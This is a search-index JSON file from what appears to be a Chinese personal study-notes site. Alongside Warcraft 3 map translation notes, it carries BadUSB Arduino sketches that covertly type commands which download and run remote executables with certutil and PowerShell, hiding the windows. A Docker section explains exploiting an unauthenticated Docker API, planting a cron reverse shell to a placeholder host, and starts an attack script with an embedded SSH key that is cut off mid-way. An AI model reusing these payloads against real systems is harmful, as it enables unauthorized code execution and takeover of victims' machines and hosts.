{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to the site \u8fd9\u662f\u4ec0\u4e48\u7ad9\u70b9 \u8fd9\u662f\u6211\u81ea\u5df1\u7684\u7b14\u8bb0 \u4e3a\u4ec0\u4e48\u4f1a\u6709\u8fd9\u4e2a\u7ad9\u70b9 \u4e3a\u4e86\u53d1\u626c\u4e92\u8054\u7f51\u5f00\u6e90\u7cbe\u795e\uff0c\u6240\u4ee5\u51b3\u5b9a\u5206\u4eab\u81ea\u5df1\u7684\u5b66\u4e60\u8fc7\u7a0b\u4e0e\u5b66\u4e60\u7b14\u8bb0\uff0c\u8fd9\u91cc\u90fd\u662f\u6211\u7684\u4e00\u4e9b\u5b66\u4e60\u8bb0\u5f55\u3002 \u4e3a\u4ec0\u4e48\u6709\u7684\u6587\u7ae0\u6709\u6392\u7248\u9519\u8bef \u56e0\u4e3a\u8fd9\u4e9b\u6587\u7ae0\u90fd\u662f\u672c\u5730\u7684\uff0c\u7528\u9759\u6001\u6a21\u677f\u5957\u7684\u65f6\u5019\u4f1a\u51fa\u73b0\u4e00\u4e9b\u95ee\u9898\uff0c\u7b49\u6709\u65f6\u95f4\u518d\u6539\u5427\u3002 \u4e3a\u4ec0\u4e48\u6709\u7684\u6587\u7ae0\u5f88\u7b80\u7565 \u56e0\u4e3a\u90fd\u662f\u81ea\u5df1\u7684\u7b14\u8bb0\uff0c\u6240\u4ee5\u66f4\u591a\u7684\u662f\u8bb0\u5f55\u7684\u8fc7\u7a0b\u3002","title":"Welcome to the site"},{"location":"#welcome-to-the-site","text":"","title":"Welcome to the site"},{"location":"#_1","text":"\u8fd9\u662f\u6211\u81ea\u5df1\u7684\u7b14\u8bb0","title":"\u8fd9\u662f\u4ec0\u4e48\u7ad9\u70b9"},{"location":"#_2","text":"\u4e3a\u4e86\u53d1\u626c\u4e92\u8054\u7f51\u5f00\u6e90\u7cbe\u795e\uff0c\u6240\u4ee5\u51b3\u5b9a\u5206\u4eab\u81ea\u5df1\u7684\u5b66\u4e60\u8fc7\u7a0b\u4e0e\u5b66\u4e60\u7b14\u8bb0\uff0c\u8fd9\u91cc\u90fd\u662f\u6211\u7684\u4e00\u4e9b\u5b66\u4e60\u8bb0\u5f55\u3002","title":"\u4e3a\u4ec0\u4e48\u4f1a\u6709\u8fd9\u4e2a\u7ad9\u70b9"},{"location":"#_3","text":"\u56e0\u4e3a\u8fd9\u4e9b\u6587\u7ae0\u90fd\u662f\u672c\u5730\u7684\uff0c\u7528\u9759\u6001\u6a21\u677f\u5957\u7684\u65f6\u5019\u4f1a\u51fa\u73b0\u4e00\u4e9b\u95ee\u9898\uff0c\u7b49\u6709\u65f6\u95f4\u518d\u6539\u5427\u3002","title":"\u4e3a\u4ec0\u4e48\u6709\u7684\u6587\u7ae0\u6709\u6392\u7248\u9519\u8bef"},{"location":"#_4","text":"\u56e0\u4e3a\u90fd\u662f\u81ea\u5df1\u7684\u7b14\u8bb0\uff0c\u6240\u4ee5\u66f4\u591a\u7684\u662f\u8bb0\u5f55\u7684\u8fc7\u7a0b\u3002","title":"\u4e3a\u4ec0\u4e48\u6709\u7684\u6587\u7ae0\u5f88\u7b80\u7565"},{"location":"WAR3/%E5%9C%B0%E5%9B%BE%E5%AD%98%E6%A1%A3/","text":"\u739b\u6cd5\u91cc\u5965\u7684\u4efb\u52a1 \u6e90\u5730\u5740 https://www.hiveworkshop.com/threads/malfurions-quest-v1-4b.239052/ \u5f53\u524d\u5730\u56fe\u7248\u672c 2019\u5e746\u6708 1.4b \u63a8\u8350\u6e38\u620f\u7a0b\u5e8f\u7248\u672c 1.31 \u5730\u56fe\u63cf\u8ff0 \u4f60\u662f\u9a6c\u5c14\u5f17\u91cc\u6602\u98ce\u66b4\u4e4b\u6012\uff0c\u6697\u591c\u7cbe\u7075\u7684\u5927\u5fb7\u9c81\u4f0a\u548c\u5361\u5229\u59c6\u591a\u7684\u4fdd\u62a4\u8005\u3002\u4e00\u4e2a\u4f1f\u5927\u7684\u9884\u8a00\u9884\u8a00\u4e86\u71c3\u70e7\u519b\u56e2\u7684\u56de\u5f52\uff0c\u4ed6\u4eec\u8bd5\u56fe\u4e00\u52b3\u6c38\u9038\u5730\u6467\u6bc1\u827e\u6cfd\u62c9\u65af\u3002 \u4e00\u4e07\u5e74\u6765\uff0c\u4f60\u4e00\u76f4\u5728\u7fe1\u7fe0\u68a6\u5883\u4e2d\u6f2b\u6e38\uff0c\u7b49\u5f85\u7740\u4f60\u56de\u6765\u7684\u90a3\u4e00\u5929\uff0c\u5e26\u9886\u4f60\u7684\u4eba\u6c11\u5bf9\u6297\u6076\u9b54\u3002\u7136\u800c\uff0c\u4f60\u89c9\u5f97\u4e16\u754c\u5728\u4f60\u7f3a\u5e2d\u671f\u95f4\u53d1\u751f\u4e86\u5f88\u5927\u53d8\u5316\u3002\u5c3d\u7ba1\u8bfa\u8fbe\u5e0c\u5c14\u6212\u5907\u68ee\u4e25\uff0c\u80cc\u53db\u8005\u4f0a\u5229\u4e39\u88ab\u6df1\u6df1\u5730\u5c01\u5370\u5728\u4ed6\u7684\u76d1\u72f1\u91cc\uff0c\u4f46\u4f60\u611f\u89c9\u5230\u4e00\u4e9b\u975e\u5e38\u4e0d\u5bf9\u52b2\u7684\u4e1c\u897f\uff0c\u5a01\u80c1\u7740\u4f60\u7684\u4eba\u6c11\u7684\u751f\u5b58\u3002 \u4f60\u7684\u601d\u60f3\u88ab\u6000\u7591\u4e86\uff0c\u9884\u8a00\u7684\u5b9e\u73b0\u8d8a\u6765\u8d8a\u8fd1\u4e86\u3002\u4f60\u4f1a\u505a\u51fa\u727a\u7272\u6765\u786e\u4fdd\u827e\u6cfd\u62c9\u65af\u4ece\u71c3\u70e7\u519b\u56e2\u4e2d\u5e78\u5b58\u4e0b\u6765\u5417\uff1f\u5728\u73a9\u739b\u6cd5\u91cc\u5965\u7684\u4efb\u52a1\u65f6\u627e\u51fa\u7b54\u6848\uff0c\u8fd9\u662f\u7279\u6069\u7f57\u9b54\u517d\u4e89\u9738 10 \u7cfb\u5217\u6218\u5f79\u4e2d\u7684\u53f2\u8bd7\u822c\u7684\u7ed3\u5c40\u3002 \u5b89\u88c5\u65b9\u5f0f \u6b63\u5e38\u5b89\u88c5 \u5f53\u524d\u7ffb\u8bd1\u8fdb\u5ea6(\u4e0d\u5305\u62ec\u7269\u54c1\u548c\u6280\u80fd) \u5df2\u5b8c\u6210\u7684 opt-NightElfTurnro01 opt-NightElfTurnro02 opt-NightElfTurnro02i opt-NightElfTurnro03h opt-NightElfTurnro03hi opt-NightElfTurnro04h1 opt-NightElfTurnro04h2 opt-NightElfTurnro04hi opt-NightElfTurnro05h opt-NightElfTurnro05hi opt-NightElfTurnro06ha \u8840\u7cbe\u7075\u7684\u5d1b\u8d77","title":"\u5730\u56fe\u5b58\u6863"},{"location":"WAR3/%E5%9C%B0%E5%9B%BE%E5%AD%98%E6%A1%A3/#_1","text":"","title":"\u739b\u6cd5\u91cc\u5965\u7684\u4efb\u52a1"},{"location":"WAR3/%E5%9C%B0%E5%9B%BE%E5%AD%98%E6%A1%A3/#_2","text":"https://www.hiveworkshop.com/threads/malfurions-quest-v1-4b.239052/","title":"\u6e90\u5730\u5740"},{"location":"WAR3/%E5%9C%B0%E5%9B%BE%E5%AD%98%E6%A1%A3/#_3","text":"2019\u5e746\u6708 1.4b","title":"\u5f53\u524d\u5730\u56fe\u7248\u672c"},{"location":"WAR3/%E5%9C%B0%E5%9B%BE%E5%AD%98%E6%A1%A3/#_4","text":"1.31","title":"\u63a8\u8350\u6e38\u620f\u7a0b\u5e8f\u7248\u672c"},{"location":"WAR3/%E5%9C%B0%E5%9B%BE%E5%AD%98%E6%A1%A3/#_5","text":"\u4f60\u662f\u9a6c\u5c14\u5f17\u91cc\u6602\u98ce\u66b4\u4e4b\u6012\uff0c\u6697\u591c\u7cbe\u7075\u7684\u5927\u5fb7\u9c81\u4f0a\u548c\u5361\u5229\u59c6\u591a\u7684\u4fdd\u62a4\u8005\u3002\u4e00\u4e2a\u4f1f\u5927\u7684\u9884\u8a00\u9884\u8a00\u4e86\u71c3\u70e7\u519b\u56e2\u7684\u56de\u5f52\uff0c\u4ed6\u4eec\u8bd5\u56fe\u4e00\u52b3\u6c38\u9038\u5730\u6467\u6bc1\u827e\u6cfd\u62c9\u65af\u3002 \u4e00\u4e07\u5e74\u6765\uff0c\u4f60\u4e00\u76f4\u5728\u7fe1\u7fe0\u68a6\u5883\u4e2d\u6f2b\u6e38\uff0c\u7b49\u5f85\u7740\u4f60\u56de\u6765\u7684\u90a3\u4e00\u5929\uff0c\u5e26\u9886\u4f60\u7684\u4eba\u6c11\u5bf9\u6297\u6076\u9b54\u3002\u7136\u800c\uff0c\u4f60\u89c9\u5f97\u4e16\u754c\u5728\u4f60\u7f3a\u5e2d\u671f\u95f4\u53d1\u751f\u4e86\u5f88\u5927\u53d8\u5316\u3002\u5c3d\u7ba1\u8bfa\u8fbe\u5e0c\u5c14\u6212\u5907\u68ee\u4e25\uff0c\u80cc\u53db\u8005\u4f0a\u5229\u4e39\u88ab\u6df1\u6df1\u5730\u5c01\u5370\u5728\u4ed6\u7684\u76d1\u72f1\u91cc\uff0c\u4f46\u4f60\u611f\u89c9\u5230\u4e00\u4e9b\u975e\u5e38\u4e0d\u5bf9\u52b2\u7684\u4e1c\u897f\uff0c\u5a01\u80c1\u7740\u4f60\u7684\u4eba\u6c11\u7684\u751f\u5b58\u3002 \u4f60\u7684\u601d\u60f3\u88ab\u6000\u7591\u4e86\uff0c\u9884\u8a00\u7684\u5b9e\u73b0\u8d8a\u6765\u8d8a\u8fd1\u4e86\u3002\u4f60\u4f1a\u505a\u51fa\u727a\u7272\u6765\u786e\u4fdd\u827e\u6cfd\u62c9\u65af\u4ece\u71c3\u70e7\u519b\u56e2\u4e2d\u5e78\u5b58\u4e0b\u6765\u5417\uff1f\u5728\u73a9\u739b\u6cd5\u91cc\u5965\u7684\u4efb\u52a1\u65f6\u627e\u51fa\u7b54\u6848\uff0c\u8fd9\u662f\u7279\u6069\u7f57\u9b54\u517d\u4e89\u9738 10 \u7cfb\u5217\u6218\u5f79\u4e2d\u7684\u53f2\u8bd7\u822c\u7684\u7ed3\u5c40\u3002","title":"\u5730\u56fe\u63cf\u8ff0"},{"location":"WAR3/%E5%9C%B0%E5%9B%BE%E5%AD%98%E6%A1%A3/#_6","text":"\u6b63\u5e38\u5b89\u88c5","title":"\u5b89\u88c5\u65b9\u5f0f"},{"location":"WAR3/%E5%9C%B0%E5%9B%BE%E5%AD%98%E6%A1%A3/#_7","text":"\u5df2\u5b8c\u6210\u7684 opt-NightElfTurnro01 opt-NightElfTurnro02 opt-NightElfTurnro02i opt-NightElfTurnro03h opt-NightElfTurnro03hi opt-NightElfTurnro04h1 opt-NightElfTurnro04h2 opt-NightElfTurnro04hi opt-NightElfTurnro05h opt-NightElfTurnro05hi opt-NightElfTurnro06ha","title":"\u5f53\u524d\u7ffb\u8bd1\u8fdb\u5ea6(\u4e0d\u5305\u62ec\u7269\u54c1\u548c\u6280\u80fd)"},{"location":"WAR3/%E5%9C%B0%E5%9B%BE%E5%AD%98%E6%A1%A3/#_8","text":"","title":"\u8840\u7cbe\u7075\u7684\u5d1b\u8d77"},{"location":"WAR3/%E5%9C%B0%E5%9B%BE%E6%96%87%E4%BB%B6%E8%AF%B4%E6%98%8E/","text":".J \u6587\u4ef6\uff0c\u5185\u542b\u811a\u672c\u3001 \u8fc7\u573a\u52a8\u753b\u7b49\u3002\u9700\u8981\u7ffb\u8bd1\u3002 .wts \u5730\u56fe\u63cf\u8ff0\u6587\u4ef6\uff0c\u5305\u542b\u7ae0\u8282\u8bf4\u660e\uff0c\u5404\u79cd\u5b57\u7b26\u4e32\u7b49\u3002\u9700\u8981\u7ffb\u8bd1\u3002 \"([^\"]*)\" w3n\u4e2d\u7684w3x\u6587\u4ef6\u4e0d\u80fd\u4ee5\u538b\u7f29\u5c5e\u6027\u653e\u7f6e\u4e8ew3n\u5185","title":"\u5730\u56fe\u6587\u4ef6\u8bf4\u660e"},{"location":"Web%E7%9B%B8%E5%85%B3/BadUSB%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81/","text":"\u8bb0\u5f55\u4e00\u4e0b \u6bd4\u8f83\u91cd\u8981\u7684\u6307\u4ee4 Keyboard.press(KEY_CAPS_LOCK); //\u5207\u6362\u5927\u5c0f\u5199\uff0c\u7531\u4e8e\u4e2d\u6587\u8f93\u5165\u6cd5\u7684\u539f\u56e0\uff0c\u5982\u679c\u952e\u76d8\u5904\u4e8e\u4e2d\u6587\u8f93\u5165\u72b6\u6001\uff0c\u90a3\u4e48\u6572\u7684\u4ee3\u7801\u90fd\u4f1a\u53d8\u6210\u62fc\u97f3\uff0c\u6240\u4ee5\u9700\u8981\u5207\u6362\u5927\u5c0f\u5199\uff0c\u5982\u679c\u952e\u76d8\u672c\u8eab\u5904\u4e8e\u5927\u5199\u72b6\u6001\u7684\u8bdd\uff0c\u90a3\u4e48\u7528\u4e86\u8fd9\u4e2a\u5c31\u4f1a\u5207\u56de\u5c0f\u5199\u72b6\u6001\u3002 cmd /q /c mode con:COLS=15 LINES=1 //\u7f29\u5c0fcmd\u7a97\u4f53\u5230\u6700\u5c0f\uff0c\u5c3d\u53ef\u80fd\u7684\u51cf\u5c11\u6000\u7591\u5ea6\u5427 \u793a\u4f8b\u4e00 \u8fdc\u7a0b\u4e0b\u8f7dvbs\u811a\u672c\u5e76\u8fd0\u884c #include <Keyboard.h> void setup() { Keyboard.begin(); delay(1000); Keyboard.press(KEY_LEFT_GUI); delay(200); Keyboard.press('r'); delay(200); Keyboard.release(KEY_LEFT_GUI); Keyboard.release('r'); Keyboard.press(KEY_CAPS_LOCK); Keyboard.release(KEY_CAPS_LOCK); delay(300); Keyboard.println(\"cmd /q /c mode con:COLS=15 LINES=1 && certutil -urlcache -split -f http://0.0.0.0:8888/run.vbs d:\\\\run.vbs && timeout /t 1 && start /B d:\\\\run.vbs\" ); //\u65e0\u56de\u663e //Keyboard.println(\"cmd /T:01 /K \\\"@echo off && mode con:COLS=15 LINES=1\\\"\"); //\u6709\u56de\u663e Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); Keyboard.press(KEY_CAPS_LOCK); Keyboard.release(KEY_CAPS_LOCK); Keyboard.end(); } void loop() { } vbs\u811a\u672c \u8fdc\u7a0b\u4e0b\u8f7dbat\u8fd0\u884c set ws=WScript.CreateObject(\"WScript.Shell\") ws.Run \"cmd /c certutil -urlcache -split -f http://0.0.0.0:8888/POWERSHELL.BAT d:\\\\POWERSHELL.BAT && start /B d:\\\\POWERSHELL.BAT\",0 \u6284\u7684k8gege\u7684 echo strFileURL = \"http://0.0.0.0/1.exe\" > K8.vbs echo strHDLocation = \"x.exe\" >> K8.vbs\" echo Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\") >> K8.vbs echo objXMLHTTP.open \"GET\", strFileURL, false >> K8.vbs echo objXMLHTTP.send() >> K8.vbs echo If objXMLHTTP.Status = 200 Then >> K8.vbs echo Set objADOStream = CreateObject(\"ADODB.Stream\") >> K8.vbs echo objADOStream.Open >> K8.vbs echo objADOStream.Type = 1 >> K8.vbs echo objADOStream.Write objXMLHTTP.ResponseBody >> K8.vbs echo objADOStream.Position = 0 >> K8.vbs echo Set objFSO = Createobject(\"Scripting.FileSystemObject\") >> K8.vbs echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> K8.vbs echo Set objFSO = Nothing >> K8.vbs echo objADOStream.SaveToFile strHDLocation >> K8.vbs echo objADOStream.Close >> K8.vbs echo Set objADOStream = Nothing >> K8.vbs echo End if >> K8.vbs echo Set objXMLHTTP = Nothing >> K8.vbs \u793a\u4f8b\u4e8c \u5229\u7528powershell\u6267\u884cexe #include<Keyboard.h> void setup(){ Keyboard.begin(); delay(3000);//\u5ef6\u65f6 Keyboard.press(KEY_CAPS_LOCK); Keyboard.press(KEY_LEFT_GUI); Keyboard.press(KEY_LEFT_GUI); delay(500); Keyboard.press('r'); delay(500); Keyboard.release(KEY_LEFT_GUI); Keyboard.release('r'); delay(500); Keyboard.press(KEY_CAPS_LOCK); delay(500); Keyboard.println(\"cmd\"); Keyboard.press(KEY_RETURN); delay(500); Keyboard.release(KEY_RETURN); Keyboard.println(\"powershell\"); Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); Keyboard.println(\"$clnt=new-object system.net.webclient;\"); Keyboard.press(KEY_RETURN); delay(800); Keyboard.release(KEY_RETURN); Keyboard.println(\"$url='http://0.0.0.0:10880/ez.exe';\"); Keyboard.press(KEY_RETURN); delay(1000); Keyboard.release(KEY_RETURN); Keyboard.println(\"$file='c:\\\\windows\\\\temp\\\\ez.exe';\"); Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(800); Keyboard.println(\"$clnt.downloadfile($url,$file);\"); Keyboard.press(KEY_RETURN); delay(800); Keyboard.release(KEY_RETURN); Keyboard.println(\"start-process c:\\\\windows\\\\temp\\\\ez.exe -windowstyle hidden\"); Keyboard.press(KEY_RETURN); delay(800); Keyboard.release(KEY_RETURN); Keyboard.println(\"msg %username% /time:10 your computer not safe\"); Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); Keyboard.println(\"cls\"); Keyboard.press(KEY_RETURN); delay(300); Keyboard.press(KEY_RETURN); Keyboard.press(KEY_RETURN); delay(300); Keyboard.press(KEY_RETURN); delay(300); Keyboard.press(KEY_RETURN); Keyboard.println(\"exit\"); Keyboard.press(KEY_RETURN); delay(300); Keyboard.press(KEY_RETURN); delay(300); Keyboard.println(\"exit\"); Keyboard.press(KEY_RETURN); delay(300); Keyboard.release(KEY_RETURN); Keyboard.println(\"exit\"); Keyboard.press(KEY_RETURN); delay(300); Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(300); Keyboard.end(); } void loop() { }","title":"BadUSB\u7684\u4e00\u4e9b\u793a\u4f8b\u4ee3\u7801"},{"location":"Web%E7%9B%B8%E5%85%B3/BadUSB%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81/#_1","text":"Keyboard.press(KEY_CAPS_LOCK); //\u5207\u6362\u5927\u5c0f\u5199\uff0c\u7531\u4e8e\u4e2d\u6587\u8f93\u5165\u6cd5\u7684\u539f\u56e0\uff0c\u5982\u679c\u952e\u76d8\u5904\u4e8e\u4e2d\u6587\u8f93\u5165\u72b6\u6001\uff0c\u90a3\u4e48\u6572\u7684\u4ee3\u7801\u90fd\u4f1a\u53d8\u6210\u62fc\u97f3\uff0c\u6240\u4ee5\u9700\u8981\u5207\u6362\u5927\u5c0f\u5199\uff0c\u5982\u679c\u952e\u76d8\u672c\u8eab\u5904\u4e8e\u5927\u5199\u72b6\u6001\u7684\u8bdd\uff0c\u90a3\u4e48\u7528\u4e86\u8fd9\u4e2a\u5c31\u4f1a\u5207\u56de\u5c0f\u5199\u72b6\u6001\u3002 cmd /q /c mode con:COLS=15 LINES=1 //\u7f29\u5c0fcmd\u7a97\u4f53\u5230\u6700\u5c0f\uff0c\u5c3d\u53ef\u80fd\u7684\u51cf\u5c11\u6000\u7591\u5ea6\u5427","title":"\u6bd4\u8f83\u91cd\u8981\u7684\u6307\u4ee4"},{"location":"Web%E7%9B%B8%E5%85%B3/BadUSB%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81/#_2","text":"\u8fdc\u7a0b\u4e0b\u8f7dvbs\u811a\u672c\u5e76\u8fd0\u884c #include <Keyboard.h> void setup() { Keyboard.begin(); delay(1000); Keyboard.press(KEY_LEFT_GUI); delay(200); Keyboard.press('r'); delay(200); Keyboard.release(KEY_LEFT_GUI); Keyboard.release('r'); Keyboard.press(KEY_CAPS_LOCK); Keyboard.release(KEY_CAPS_LOCK); delay(300); Keyboard.println(\"cmd /q /c mode con:COLS=15 LINES=1 && certutil -urlcache -split -f http://0.0.0.0:8888/run.vbs d:\\\\run.vbs && timeout /t 1 && start /B d:\\\\run.vbs\" ); //\u65e0\u56de\u663e //Keyboard.println(\"cmd /T:01 /K \\\"@echo off && mode con:COLS=15 LINES=1\\\"\"); //\u6709\u56de\u663e Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); Keyboard.press(KEY_CAPS_LOCK); Keyboard.release(KEY_CAPS_LOCK); Keyboard.end(); } void loop() { } vbs\u811a\u672c \u8fdc\u7a0b\u4e0b\u8f7dbat\u8fd0\u884c set ws=WScript.CreateObject(\"WScript.Shell\") ws.Run \"cmd /c certutil -urlcache -split -f http://0.0.0.0:8888/POWERSHELL.BAT d:\\\\POWERSHELL.BAT && start /B d:\\\\POWERSHELL.BAT\",0 \u6284\u7684k8gege\u7684 echo strFileURL = \"http://0.0.0.0/1.exe\" > K8.vbs echo strHDLocation = \"x.exe\" >> K8.vbs\" echo Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\") >> K8.vbs echo objXMLHTTP.open \"GET\", strFileURL, false >> K8.vbs echo objXMLHTTP.send() >> K8.vbs echo If objXMLHTTP.Status = 200 Then >> K8.vbs echo Set objADOStream = CreateObject(\"ADODB.Stream\") >> K8.vbs echo objADOStream.Open >> K8.vbs echo objADOStream.Type = 1 >> K8.vbs echo objADOStream.Write objXMLHTTP.ResponseBody >> K8.vbs echo objADOStream.Position = 0 >> K8.vbs echo Set objFSO = Createobject(\"Scripting.FileSystemObject\") >> K8.vbs echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> K8.vbs echo Set objFSO = Nothing >> K8.vbs echo objADOStream.SaveToFile strHDLocation >> K8.vbs echo objADOStream.Close >> K8.vbs echo Set objADOStream = Nothing >> K8.vbs echo End if >> K8.vbs echo Set objXMLHTTP = Nothing >> K8.vbs","title":"\u793a\u4f8b\u4e00"},{"location":"Web%E7%9B%B8%E5%85%B3/BadUSB%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81/#_3","text":"\u5229\u7528powershell\u6267\u884cexe #include<Keyboard.h> void setup(){ Keyboard.begin(); delay(3000);//\u5ef6\u65f6 Keyboard.press(KEY_CAPS_LOCK); Keyboard.press(KEY_LEFT_GUI); Keyboard.press(KEY_LEFT_GUI); delay(500); Keyboard.press('r'); delay(500); Keyboard.release(KEY_LEFT_GUI); Keyboard.release('r'); delay(500); Keyboard.press(KEY_CAPS_LOCK); delay(500); Keyboard.println(\"cmd\"); Keyboard.press(KEY_RETURN); delay(500); Keyboard.release(KEY_RETURN); Keyboard.println(\"powershell\"); Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); Keyboard.println(\"$clnt=new-object system.net.webclient;\"); Keyboard.press(KEY_RETURN); delay(800); Keyboard.release(KEY_RETURN); Keyboard.println(\"$url='http://0.0.0.0:10880/ez.exe';\"); Keyboard.press(KEY_RETURN); delay(1000); Keyboard.release(KEY_RETURN); Keyboard.println(\"$file='c:\\\\windows\\\\temp\\\\ez.exe';\"); Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(800); Keyboard.println(\"$clnt.downloadfile($url,$file);\"); Keyboard.press(KEY_RETURN); delay(800); Keyboard.release(KEY_RETURN); Keyboard.println(\"start-process c:\\\\windows\\\\temp\\\\ez.exe -windowstyle hidden\"); Keyboard.press(KEY_RETURN); delay(800); Keyboard.release(KEY_RETURN); Keyboard.println(\"msg %username% /time:10 your computer not safe\"); Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); Keyboard.println(\"cls\"); Keyboard.press(KEY_RETURN); delay(300); Keyboard.press(KEY_RETURN); Keyboard.press(KEY_RETURN); delay(300); Keyboard.press(KEY_RETURN); delay(300); Keyboard.press(KEY_RETURN); Keyboard.println(\"exit\"); Keyboard.press(KEY_RETURN); delay(300); Keyboard.press(KEY_RETURN); delay(300); Keyboard.println(\"exit\"); Keyboard.press(KEY_RETURN); delay(300); Keyboard.release(KEY_RETURN); Keyboard.println(\"exit\"); Keyboard.press(KEY_RETURN); delay(300); Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(300); Keyboard.end(); } void loop() { }","title":"\u793a\u4f8b\u4e8c"},{"location":"Web%E7%9B%B8%E5%85%B3/Docker/","text":"Docker \u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u5e94\u7528\u5bb9\u5668\u5f15\u64ce\uff0c\u57fa\u4e8e Go \u8bed\u8a00 \u5e76\u9075\u4ece Apache2.0 \u534f\u8bae\u5f00\u6e90\u3002 \u5224\u65addocker\uff1a cat /proc/self/cgroup cat /.dockerenv API\u672a\u6388\u6743\u8bbf\u95ee \u67e5\u770bimages 2375:/images/json /containers/json \u547d\u4ee4\u884c\u67e5\u770bimages docker -H tcp://10.1.1.1:2375 images \u547d\u4ee4\u884c\u521b\u5efa\u5bb9\u5668\u5e76\u8fdb\u5165\uff0c\u5c06\u5bbf\u4e3b\u673a\u6839\u76ee\u5f55\u6302\u8f7d\u5230\u5bb9\u5668/tmp\u4e0b docker -H tcp://10.1.1.1:2375 run -it -v /:/mnt 170de16e73ea /bin/bash \u5199\u8ba1\u5212\u4efb\u52a1\u53cd\u5f39\u5bbf\u4e3b\u673a echo '* * * * * bash -i >& /dev/tcp/x.x.x.x/8888 0>&1' >> /test/var/spool/cron/root \u5229\u7528\u811a\u672c\uff1a #-*- coding:utf-8 -*- #author:L.N.@insight-labs.org #docker-py == 1.8.1 import urllib2 import urllib import json import sys import getopt from docker import Client def http_get(url): response = urllib2.urlopen(url) return response.read() def http_post(url, values): jdata = values #print url #print jdata send_headers = { 'Content-Type':'application/json' } req = urllib2.Request(url, data=jdata,headers=send_headers) response = urllib2.urlopen(req) return response.read() def isset(v): try : type(eval(v)) except: return 0 else: return 1 def printport(portsList, name): if isset(\"portsList['IP']\") == 0: portsList['IP']=\"*\" printport(portsList,name) elif isset(\"portsList['Type']\") == 0: portsList['Type']=\"*\" printport(portsList,name) elif isset(\"portsList['PublicPort']\") == 0: portsList['PublicPort']=\"*\" printport(portsList,name) elif isset(\"portsList['PrivatePort']\") == 0: portsList['PrivatePort']=\"*\" printport(portsList,name) else: print \"[-]\"+name+\"[+]\"+portsList['Type']+\"[-]\"+portsList['IP']+\":\"+str(portsList['PrivatePort'])+\" --> \"+host+\":\"+str(portsList['PublicPort']) def createClient(host,port,version): clientApiVersion = getversion(host,port,version) print \"[-]ClientApiVersion:\"+clientApiVersion cli = Client(base_url='tcp://'+host+':'+port,version=clientApiVersion) return cli def getversion(host,port,version): url = \"http://\"+host+\":\"+port+\"/version\" ret = json.loads(http_get(url)) if version != '': clientApiVersion = version else: clientApiVersion = ret['ApiVersion'] return clientApiVersion def printContainer(host,port,version,allContainer): cli = createClient(host,port,version) if allContainer == 1: ret = cli.containers(all=True) else: ret = cli.containers() for info in ret: print \"[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]\" print \"[-] id: \"+info['Id'] print \"[-] Names: \"+info['Names'][0] print \"[-] Image: \"+info['Image'] print \"[-] Status: \"+info['Status'] print \"[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]\" if __name__ == \"__main__\": opts, args = getopt.getopt(sys.argv[1:], \"v:kauVCcsLli:e:h:p:H:P:I:\") key = 0 version ='' payload ='' sshkey = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCoecC7vmWn4s2y4T+Pc3bJ0owDYWzGIBTCWWonN4qMTCbe66hKopgtUuHC1y5H3HFQ0qsni0vFAGSoO4TLiIpvHUXbf9Wi9vR2q4oYphH9Kgsd3cVXsHUFcgybwdk5DCXpmoSJTlEoOrtWajYdyuALMy+CqpkwWDj+uTz+9/2P3T0Nh5F+U+UZOgSqIi5xQfUGJKGoFGXwvpqEL6UnGG4bbgGxVa5mJZVH0cxwKK6w7luezkcRVBEJ1SZAkjZOmZojyJbYQolItcBNBsXQ+cakjg3DeU69wrDiBdP+k2i2k3uzhJqJXfxLdxUZfjgXHwSOzDb2D5+841trASAwZAy1Gq4uwkbmwupe/qTPK2R31d5h4Jqx4N19eUjT8GkkDj+mnJTwYyOPJH/ghEvn4UfNOtohM2lZPbskvvskn82g0WzYJ5JnQaKfup1IYLTraBbJ5UdVYsCfG5ddRZF4xMab2ZDgcdqyISJxHPK9/P7w7mmgSut1nK5R1+HLSl/xDAPcoVd0H3ePqxN9ZD0BoMjY8fPxKAQR+bB5M05iDIIwUxhj2NQvCpwxxGwJXUSf13zirXRZhkZGnWrkNrzqHzpLZqoEBCEORErmFAvsI8yIBvThSylReiwhAWkdL7ONQ4dd7UgsQfY/0MMfxd8/V+041I1sIVUVBnHYUUwqE0eZ9Q== wanniba@wanniba.com' for op, value in opts: if op ==\"-l\": imagesList = 1 elif op == \"-i\": imageName = value elif op == \"-e\": dataExec = value elif op == \"-h\": host = value elif op =='-p': port = value elif op == '-L': portList = 1 elif op == '-H': lhsot = value elif op == '-P': lport = value elif op =='-C': createContainer = 1 elif op == '-v': version = value elif op == '-V': version = 1 elif op == '-c': closeContainer = 1 elif op == '-I': imageId = value elif op == '-a': allContainer = 1 elif op == '-s': startContainer = 1 elif op == '-k': key = 1 elif op == '-u': isUbuntu = 1 if isset('lhsot') and isset('lport'): if isset('isUbuntu'): payload = 